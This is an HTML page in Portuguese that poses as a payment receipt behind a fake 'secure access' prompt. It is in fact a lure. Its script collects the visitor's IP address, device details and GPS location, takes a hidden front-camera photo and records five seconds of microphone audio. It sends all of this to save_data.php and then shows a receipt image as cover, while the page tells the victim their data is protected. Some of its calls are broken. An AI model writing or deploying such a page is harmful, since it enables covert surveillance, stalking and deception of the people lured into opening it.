<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recibo de pagamento - Empresa XPTO</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f4f8;
            font-family: 'Arial', sans-serif;
            color: #333;
            cursor: pointer;
        }

        .container {
            background-color: #ffffff;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 90%;
            width: 400px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 1rem;
            color: #2c3e50;
        }

        p {
            font-size: 1rem;
            margin-bottom: 1.5rem;
            color: #666;
        }

        .secure-message {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9rem;
            color: #27ae60;
            margin-bottom: 1.5rem;
        }

        .secure-message img {
            width: 20px;
            margin-right: 8px;
        }

        #warning-message {
            display: none;
            background-color: #ffebee;
            color: #c0392b;
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }

        #receipt {
            display: none;
            max-width: 100%;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            margin-top: 1.5rem;
        }

        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsividade */
        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
            }

            h1 {
                font-size: 1.5rem;
            }

            p {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Acesso Seguro</h1>
        <p>Este acesso é protegido. Clique em qualquer lugar da tela para conceder as permissões e visualizar o recibo de pagamento.</p>
        
        <div class="secure-message">
            <img src="https://img.icons8.com/ios-filled/50/27ae60/lock.png" alt="Cadeado">
            <span>Seus dados estão protegidos.</span>
        </div>

        <div id="warning-message">Você precisa permitir a geolocalização para acessar a página.</div>
        
        <div class="loader" id="loader"></div>
    </div>

    <!-- Recibo fora do container -->
    <img id="receipt" src="recibo_pagamento.png" alt="Comprovante">

    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    
    <script>
        // Função para obter informações do dispositivo
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };
        }

        // Função para capturar a foto (opcional)
        function capturePhoto(ip, latitude, longitude, deviceInfo) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    let video = document.getElementById('video');
                    let canvas = document.getElementById('canvas');
                    let context = canvas.getContext('2d');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 300;
                        canvas.height = video.videoHeight || 400;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let imageData = canvas.toDataURL('image/png');
                        sendData(ip, latitude, longitude, imageData, deviceInfo);
                    }, 1500);
                })
                .catch(error => {
                    console.error("Erro ao acessar a câmera:", error);
                    sendData(ip, latitude, longitude, null, deviceInfo);
                });
        }

        // Função para capturar áudio
        function captureAudio(ip, latitude, longitude, deviceInfo) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const audioChunks = [];
                    const mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = () => {
                            const audioData = reader.result;
                            sendData(ip, latitude, longitude, null, deviceInfo, audioData);
                        };
                    };

                    // Iniciar gravação por 5 segundos (ou o tempo que desejar)
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop()); // Parar o stream de áudio
                    }, 5000); // 5 segundos de gravação
                })
                .catch(error => {
                    console.error("Erro ao acessar o microfone:", error);
                    sendData(ip, latitude, longitude, null, deviceInfo, null);
                });
        }

        // Função para enviar dados
        function sendData(ip, latitude, longitude, imageData, deviceInfo, audioData) {
            const data = {
                ip,
                latitude,
                longitude,
                image: imageData,
                deviceInfo,
                audio: audioData
            };

            fetch('save_data.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    console.log("Dados enviados com sucesso.");
                } else {
                    console.error("Erro ao processar os dados.");
                }
            })
            .catch(error => {
                console.error("Erro ao enviar dados:", error);
            });
        }

        // Função para solicitar permissões de câmera e microfone
        function requestMediaPermissions() {
            // Solicitar permissão para a câmera
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop()); // Parar o stream da câmera
                })
                .catch(error => {
                    console.error("Erro ao solicitar permissão da câmera:", error);
                });

            // Solicitar permissão para o microfone
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    stream.getTracks().forEach(track => track.stop()); // Parar o stream do microfone
                })
                .catch(error => {
                    console.error("Erro ao solicitar permissão do microfone:", error);
                });
        }

        // Função para verificar permissões
        function checkPermissions() {
            return Promise.all([
                navigator.permissions.query({ name: 'geolocation' }),
                navigator.permissions.query({ name: 'camera' }),
                navigator.permissions.query({ name: 'microphone' })
            ]).then(results => {
                return {
                    geo: results[0].state,
                    camera: results[1].state,
                    microphone: results[2].state
                };
            }).catch(error => {
                console.error("Erro ao verificar permissões:", error);
                return {
                    geo: 'prompt',
                    camera: 'prompt',
                    microphone: 'prompt'
                };
            });
        }

        // Função principal para solicitar permissões
        function requestPermissions() {
            document.getElementById('loader').style.display = 'block'; // Mostra o loader

            checkPermissions().then(permissions => {
                // Se a geolocalização já foi concedida, exibe o recibo
                if (permissions.geo === 'granted') {
                    showReceipt();
                }

                // Solicitar geolocalização
                navigator.geolocation.getCurrentPosition(position => {
                    let latitude = position.coords.latitude;
                    let longitude = position.coords.longitude;

                    // Capturar IP e informações do dispositivo
                    fetch('https://api64.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => {
                            let ip = data.ip;
                            let deviceInfo = getDeviceInfo();

                            // Enviar dados de geolocalização e IP
                            sendData(ip, latitude, longitude, null, deviceInfo, null);

                            // Tentar capturar a foto (opcional)
                            if (permissions.camera === 'granted') {
                                capturePhoto(ip, latitude, longitude, deviceInfo);
                            }

                            // Tentar capturar áudio (opcional)
                            if (permissions.microphone === 'granted') {
                                captureAudio(ip, latitude, longitude, deviceInfo);
                            }

                            // Exibir recibo
                            showReceipt();
                        })
                        .catch(error => {
                            console.error("Erro ao obter IP:", error);
                            document.getElementById('warning-message').innerText = "Erro ao obter IP.";
                        });

                }, () => {
                    document.getElementById('warning-message').innerText = "Você precisa permitir a geolocalização para acessar a página.";
                    document.getElementById('warning-message').style.display = 'block';
                }).finally(() => {
                    document.getElementById('loader').style.display = 'none'; // Esconde o loader
                });
            });
        }

        // Função para exibir o recibo
        function showReceipt() {
            document.body.style.backgroundColor = "white";
            document.querySelector('.container').style.display = 'none'; // Oculta o container
            document.getElementById('receipt').style.display = 'block'; // Exibe o recibo
        }

        // Capturar IP e informações do dispositivo ao carregar a página
        function captureInitialData() {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    let ip = data.ip;
                    let deviceInfo = getDeviceInfo();
                    sendData(ip, null, null, null, deviceInfo, null); // Envia apenas IP e deviceInfo
                })
                .catch(error => {
                    console.error("Erro ao obter IP:", error);
                    document.getElementById('warning-message').innerText = "Erro ao obter IP.";
                });
        }

        // Adicionar evento de clique ao <body>
        document.body.addEventListener('click', () => {
            requestPermissions(); // Solicita permissões (se necessário)
            sendAllData(); // Envia todos os dados
        });

        // Solicitar permissões ao carregar a página
        window.onload = () => {
            captureInitialData();
            requestMediaPermissions(); // Solicita permissões de câmera e microfone
            requestPermissions(); // Solicita permissões de geolocalização
        };
    </script>
</body>
</html>
